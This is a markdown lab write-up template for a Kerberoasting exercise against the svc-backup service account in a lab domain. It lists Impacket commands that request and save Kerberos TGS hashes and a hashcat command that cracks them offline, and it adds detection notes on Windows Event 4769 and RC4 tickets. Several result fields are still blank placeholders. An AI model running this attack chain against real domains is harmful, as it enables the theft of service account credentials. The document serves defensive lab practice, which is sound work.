# Kerberoasting — svc-backup

**ATT&CK Technique:** [T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)  
**Tactic:** Credential Access  
**Environment:** TLOA Lab (`tloa.local`)  
**Target Account:** `svc-backup`  
**Date:** <!-- YYYY-MM-DD -->  
**Status:** 🔄 In Progress  

---

## Objective

Request a Kerberos TGS ticket for the `svc-backup` service account (which has an SPN configured in `tloa.local`), extract the hash from memory, and attempt offline cracking with hashcat — simulating a realistic Kerberoasting attack chain.

---

## Tools Used

| Tool | Version | Purpose |
|---|---|---|
| Impacket (`GetUserSPNs.py`) | Latest | Request TGS and extract hash |
| hashcat | Latest | Offline hash cracking |
| BloodHound | — | Identified target (svc-backup) |

---

## Execution

### Step 1 — Enumerate SPNs from Kali

```bash
impacket-GetUserSPNs tloa.local/username:password -dc-ip 192.168.204.X -request
```

Expected output: Kerberos hash for `svc-backup` in `$krb5tgs$23$*...*` format.

---

### Step 2 — Save the hash

```bash
impacket-GetUserSPNs tloa.local/username:password -dc-ip 192.168.204.X -request -outputfile kerberoast.txt
```

---

### Step 3 — Crack offline with hashcat

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
```

**Result:** <!-- cracked / not cracked -->

---

## Evidence

| Screenshot | Description |
|---|---|
| `img/01-spn-enumeration.png` | SPN query output |
| `img/02-hash-captured.png` | TGS hash captured |
| `img/03-hashcat-result.png` | Cracking result |

---

## Detection — Wazuh / Sysmon

### Was it detected?

| SIEM | Alert | Rule ID | Result |
|---|---|---|---|
| Wazuh | Kerberos TGS request anomaly | — | <!-- ✅ / ❌ --> |
| Sysmon | Event ID 4769 (Kerberos Service Ticket) | — | <!-- ✅ / ❌ --> |

### Key Windows Event

Windows Security Event **4769** (A Kerberos service ticket was requested) is the primary indicator. Look for:
- `Ticket Encryption Type: 0x17` (RC4 — weak, indicates Kerberoasting)
- `Account Name: svc-backup`

### Analysis

<!-- Fill after checking Wazuh dashboard and Windows Event Logs -->

---

## Lessons Learned

<!-- Fill after completing the exercise -->

---

## References

- [MITRE ATT&CK — T1558.003](https://attack.mitre.org/techniques/T1558/003/)
- [Impacket — GetUserSPNs](https://github.com/fortra/impacket)
- [Detecting Kerberoasting — Microsoft](https://docs.microsoft.com/en-us/defender-for-identity/lateral-movement-alerts)
